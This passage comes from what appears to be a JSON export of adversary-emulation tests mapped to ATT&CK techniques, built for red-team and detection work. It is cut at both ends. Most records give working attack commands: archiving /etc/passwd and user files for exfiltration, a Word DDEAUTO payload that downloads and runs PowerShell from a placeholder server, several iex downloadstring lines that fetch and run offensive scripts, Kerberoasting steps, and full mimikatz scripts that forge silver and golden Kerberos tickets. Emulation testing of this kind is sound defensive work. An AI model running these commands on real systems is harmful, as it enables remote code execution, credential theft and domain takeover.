"clacwm1oi00a829mq6vih3sdm"], "tags": []}, {"data": {"name": "Compressing data using zipfile in Python (Linux)", "shortName": "T1560.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses zipfile from Python to compress files\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_input_file | Path to the file that you want to compress | Path | /etc/passwd | \n | path_to_output_file | Path of the file that you want your .zip file to be | Path | /tmp/passwd.zip | "}, "executionSteps": [{"description": "$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61302zs29mq9nzhf4wz"], "tags": []}, {"data": {"name": "Compressing data using tarfile in Python (Linux)", "shortName": "T1560.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses tarfile from Python to compress files\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_input_file | Path to the file that you want to compress | Path | /etc/passwd | \n | path_to_output_file | Path of the file that you want your .tar.gz file to be | Path | /tmp/passwd.tar.gz | "}, "executionSteps": [{"description": "$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\" \n", "successCriteria": null}], "techniqueIds": ["clacwm61302zs29mq9nzhf4wz"], "tags": []}, {"data": {"name": "Compressing data using GZip in Python (Linux)", "shortName": "T1560.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses GZip from Python to compress files\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_input_file | Path to the file that you want to compress | Path | /etc/passwd | \n | path_to_output_file | Path of the file that you want your .gz file to be | Path | /tmp/passwd.gz | "}, "executionSteps": [{"description": "$which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb','compresslevel=6');output_file.write(content);output_file.close();\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61302zs29mq9nzhf4wz"], "tags": []}, {"data": {"name": "Compressing data using bz2 in Python (Linux)", "shortName": "T1560.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Uses bz2 from Python to compress files\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | path_to_input_file | Path to the file that you want to compress | Path | /etc/passwd | \n | path_to_output_file | Path of the file that you want your .bz2 file to be | Path | /tmp/passwd.bz2 | "}, "executionSteps": [{"description": "$which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(bz2content);output_file.close();\"\n", "successCriteria": null}], "techniqueIds": ["clacwm61302zs29mq9nzhf4wz"], "tags": []}, {"data": {"name": "Data Encrypted with zip and gpg symmetric", "shortName": "T1560.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Encrypt data for exiltration\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | test_folder | Path used to store files. | Path | /tmp/T1560 | \n | test_file | Temp file used to store encrypted data. | Path | T1560 | \n | encryption_password | Password used to encrypt data. | String | InsertPasswordHere | "}, "executionSteps": [{"description": "mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \"#{encryption_password}\" #{test_folder}/#{test_file} ./*\necho \"#{encryption_password}\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5oz02n429mqarqw9axq", "clacwm1cx002l29mq5ytcbjhp"], "tags": []}, {"data": {"name": "Data Compressed - nix - zip", "shortName": "T1560.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_files | Path that should be compressed into our output file, may include wildcards | Path | /var/log/{w,b}tmp | \n | output_file | Path that should be output as a zip archive | Path | $HOME/data.zip | "}, "executionSteps": [{"description": "zip #{output_file} #{input_files}\n", "successCriteria": null}], "techniqueIds": ["clacwm5oz02n429mqarqw9axq", "clacwm1cx002l29mq5ytcbjhp"], "tags": []}, {"data": {"name": "Data Compressed - nix - tar Folder or File", "shortName": "T1560.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file_folder | Path that should be compressed | Path | $HOME/$USERNAME | \n | output_file | File that should be output | Path | $HOME/data.tar.gz | "}, "executionSteps": [{"description": "tar -cvzf #{output_file} #{input_file_folder}\n", "successCriteria": null}], "techniqueIds": ["clacwm5oz02n429mqarqw9axq", "clacwm1cx002l29mq5ytcbjhp"], "tags": []}, {"data": {"name": "Data Compressed - nix - gzip Single File", "shortName": "T1560.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Path that should be compressed | Path | $HOME/victim-gzip.txt | \n | input_content | contents of compressed files if file does not already exist. default contains test credit card and social security number | String | confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101 | "}, "executionSteps": [{"description": "test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})\n", "successCriteria": null}], "techniqueIds": ["clacwm5oz02n429mqarqw9axq", "clacwm1cx002l29mq5ytcbjhp"], "tags": []}, {"data": {"name": "Compress Data for Exfiltration With Rar", "shortName": "T1560.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_path | Path that should be compressed into our output file | Path | %USERPROFILE% | \n | file_extension | Extension of files to compress | String | .txt | \n | output_file | Path where resulting compressed data should be placed | Path | %USERPROFILE%\\T1560.001-data.rar | \n | rar_installer | Winrar installer | Path | %TEMP%\\winrar.exe | \n | rar_exe | The RAR executable from Winrar | Path | %programfiles%/WinRAR/Rar.exe | "}, "executionSteps": [{"description": "\"#{rar_exe}\" a -r #{output_file} #{input_path}\\*#{file_extension}\n", "successCriteria": null}], "techniqueIds": ["clacwm5oz02n429mqarqw9axq", "clacwm1cx002l29mq5ytcbjhp"], "tags": []}, {"data": {"name": "Compress Data and lock with password for Exfiltration with winzip", "shortName": "T1560.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Note: Requires winzip installation\nwzzip sample.zip -s\"blueblue\" *.txt (VARIANT)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | winzip_exe | Path to installed Winzip executable | Path | %ProgramFiles%\\WinZip\\winzip64.exe | \n | winzip_url | Path to download Windows Credential Editor zip file | Url | https://download.winzip.com/gl/nkln/winzip24-home.exe | \n | winzip_hash | File hash of the Windows Credential Editor zip file | String | B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB | "}, "executionSteps": [{"description": "path=%path%;\"C:\\Program Files (x86)\\winzip\"\nmkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{winzip_exe}\" -min -a -s\"hello\" archive.zip *\ndir\n", "successCriteria": null}], "techniqueIds": ["clacwm5oz02n429mqarqw9axq", "clacwm1cx002l29mq5ytcbjhp"], "tags": []}, {"data": {"name": "Compress Data and lock with password for Exfiltration with winrar", "shortName": "T1560.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Note: Requires winrar installation\nrar a -p\"blue\" hello.rar (VARIANT)\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | rar_installer | Winrar installer | Path | %TEMP%\\winrar.exe | \n | rar_exe | The RAR executable from Winrar | Path | %programfiles%/WinRAR/Rar.exe | "}, "executionSteps": [{"description": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{rar_exe}\" a -hp\"blue\" hello.rar\ndir\n", "successCriteria": null}], "techniqueIds": ["clacwm5oz02n429mqarqw9axq", "clacwm1cx002l29mq5ytcbjhp"], "tags": []}, {"data": {"name": "Compress Data and lock with password for Exfiltration with 7zip", "shortName": "T1560.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Note: Requires 7zip installation\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | 7zip_installer | 7zip installer | Path | %TEMP%\\7zip.exe | \n | 7zip_exe | Path to installed 7zip executable | Path | %ProgramFiles%\\7-zip\\7z.exe | "}, "executionSteps": [{"description": "mkdir $PathToAtomicsFolder\\T1560.001\\victim-files\ncd $PathToAtomicsFolder\\T1560.001\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{7zip_exe}\" u archive.7z *txt -pblue\ndir\n", "successCriteria": null}], "techniqueIds": ["clacwm5oz02n429mqarqw9axq", "clacwm1cx002l29mq5ytcbjhp"], "tags": []}, {"data": {"name": "Compress Data for Exfiltration With PowerShell", "shortName": "T1560", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Path that should be compressed into our output file | Path | $env:USERPROFILE | \n | output_file | Path where resulting compressed data should be placed | Path | $env:USERPROFILE\\T1560-data-ps.zip | "}, "executionSteps": [{"description": "dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm64b032w29mq7n0t9yo9", "clacwm1cp002f29mqahrt0wfl"], "tags": []}, {"data": {"name": "Execute PowerShell script via Word DDE", "shortName": "T1559.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "start $PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\n", "successCriteria": null}], "techniqueIds": ["clacwm5uv02tx29mqbpgc61g5", "clacwm1r200bp29mqezqx6yoe"], "tags": []}, {"data": {"name": "Execute Commands", "shortName": "T1559.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes commands via DDE using Microsfot Word\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Open Microsoft Word\n\nInsert tab -> Quick Parts -> Field\n\nChoose = (Formula) and click ok.\n\nAfter that, you should see a Field inserted in the document with an error \"!Unexpected End of Formula\", right-click the Field, and choose Toggle Field Codes.\n\nThe Field Code should now be displayed, change it to Contain the following:\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"  }\n", "successCriteria": null}], "techniqueIds": ["clacwm5uv02tx29mqbpgc61g5", "clacwm1r200bp29mqezqx6yoe"], "tags": []}, {"data": {"name": "DDEAUTO", "shortName": "T1559.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "\nTrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "1. Open Word\n\n2. Insert tab -> Quick Parts -> Field\n\n3. Choose = (Formula) and click ok.\n\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n\n5. Right-click the Field, choose \"Toggle Field Codes\"\n\n6. Paste in the code from Unicorn or SensePost\n\n7. Save the Word document.\n\n9. DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"\n\n10. DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # \" \"Microsoft Document Security Add-On\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5uv02tx29mqbpgc61g5", "clacwm1r200bp29mqezqx6yoe"], "tags": []}, {"data": {"name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus", "shortName": "T1558.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"asreproast /format:hashcat /nowrap\"", "successCriteria": null}], "techniqueIds": ["clacwm5zt02yi29mq9alx2203"], "tags": []}, {"data": {"name": "Rubeus asreproast", "shortName": "T1558.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | local_folder | Local path of Rubeus executable | Path | $Env:temp | \n | local_executable | name of the rubeus executable | String | rubeus.exe | \n | out_file | file where command results are stored | String | rubeus_output.txt | \n | rubeus_url | URL of Rubeus executable | Url | https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe | "}, "executionSteps": [{"description": "cmd.exe /c \"#{local_folder}\\#{local_executable}\" asreproast /outfile:\"#{local_folder}\\#{out_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5zt02yi29mq9alx2203"], "tags": []}, {"data": {"name": "Get-DomainUser with PowerView", "shortName": "T1558.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose\n", "successCriteria": null}], "techniqueIds": ["clacwm5zt02yi29mq9alx2203"], "tags": []}, {"data": {"name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus", "shortName": "T1558.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"", "successCriteria": null}], "techniqueIds": ["clacwm6t903uf29mqhm15905h"], "tags": []}, {"data": {"name": "WinPwn - Kerberoasting", "shortName": "T1558.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Kerberoasting technique via function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nKerberoasting -consoleoutput -noninteractive", "successCriteria": null}], "techniqueIds": ["clacwm6t903uf29mqhm15905h"], "tags": []}, {"data": {"name": "Rubeus kerberoast", "shortName": "T1558.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | local_folder | Local path of Rubeus executable | Path | $Env:temp | \n | local_executable | name of the rubeus executable | String | rubeus.exe | \n | out_file | file where command results are stored | String | rubeus_output.txt | \n | rubeus_url | URL of Rubeus executable | Url | https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe | \n | flags | command flags you would like to run (optional and blank by default) | String | null | "}, "executionSteps": [{"description": "klist purge\ncmd.exe /c \"#{local_folder}\\#{local_executable}\" kerberoast #{flags} /outfile:\"#{local_folder}\\#{out_file}\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6t903uf29mqhm15905h"], "tags": []}, {"data": {"name": "Request for service tickets", "shortName": "T1558.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n", "successCriteria": null}], "techniqueIds": ["clacwm6t903uf29mqhm15905h", "clacwm20700hp29mqh2rp2x8k"], "tags": []}, {"data": {"name": "Request All Tickets via PowerShell", "shortName": "T1558.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain_name | The Domain Name to lookup against | String | %USERDNSDOMAIN% | "}, "executionSteps": [{"description": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n", "successCriteria": null}], "techniqueIds": ["clacwm6t903uf29mqhm15905h"], "tags": []}, {"data": {"name": "Request A Single Ticket via PowerShell", "shortName": "T1558.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\" \n", "successCriteria": null}], "techniqueIds": ["clacwm6t903uf29mqhm15905h"], "tags": []}, {"data": {"name": "Extract all accounts in use as SPN using setspn", "shortName": "T1558.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain_name | The Domain Name to lookup against | String | %USERDNSDOMAIN% | "}, "executionSteps": [{"description": "setspn -T #{domain_name} -Q */*\n", "successCriteria": null}], "techniqueIds": ["clacwm6t903uf29mqhm15905h"], "tags": []}, {"data": {"name": "Crafting Active Directory silver tickets with mimikatz", "shortName": "T1558.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain_sid | SID of the targeted domain, if you keep default it will automatically get the current domain SID | String | S-1-5-21-DEFAULT | \n | domain | Targeted Active Directory domain FQDN | String | %userdnsdomain% | \n | account | Account to impersonate | String | silverticketfakeuser | \n | target | System you want to target (Default will be logon server) | String | %logonserver:\\\\=% | \n | service_aes256_key | AES256 key (you will need to set to match your service key for your target) | String | b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 | \n | mimikatz_path | Mimikatz windows executable | Path | $env:TEMP\\mimikatz\\x64\\mimikatz.exe | "}, "executionSteps": [{"description": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt\" \"exit\"\n\n  echo.\n  echo executing:schtasks /query /S #{target}.#{domain}\n  schtasks /query /S #{target}.#{domain}\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n", "successCriteria": null}], "techniqueIds": ["clacwm6oj03p829mqgs5t0cux"], "tags": []}, {"data": {"name": "Crafting golden tickets with mimikatz", "shortName": "T1558.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domain_sid | SID of the targeted domain, if you keep default it will automatically get the current domain SID | string | S-1-5-21-DEFAULT | \n | domain | Targeted domain FQDN | string | example.com | \n | account | Account to impersonate | string | goldenticketfakeuser | \n | krbtgt_aes256_key | Krbtgt AES256 key | string | b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 | \n | mimikatz_path | Mimikatz windows executable | path | $env:TEMP\\mimikatz\\x64\\mimikatz.exe | "}, "executionSteps": [{"description": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{krbtgt_aes256_key} /user:#{account} /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\#{domain}\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore", "successCriteria": null}], "techniqueIds": ["clacwm1wt00fg29mq9hath1xs"], "tags": []}, {"data": {"name": "Crafting Active Directory golden tickets with Rubeus", "shortName": "T1558.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | domaincontroller | Targeted Active Directory domain FQDN | String | $ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\" | \n | account | Account to impersonate | String | $ENV:username | \n | krbtgt_aes256_key | Krbtgt AES256 key (you will need to set to match your krbtgt key for your domain) | String | b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 | \n | local_folder | Local path of Rubeus executable | Path | $Env:temp | \n | local_executable | name of the rubeus executable | String | rubeus.exe | \n | rubeus_url | URL of Rubeus executable | Url | https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe | "}, "executionSteps": [{"description": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt 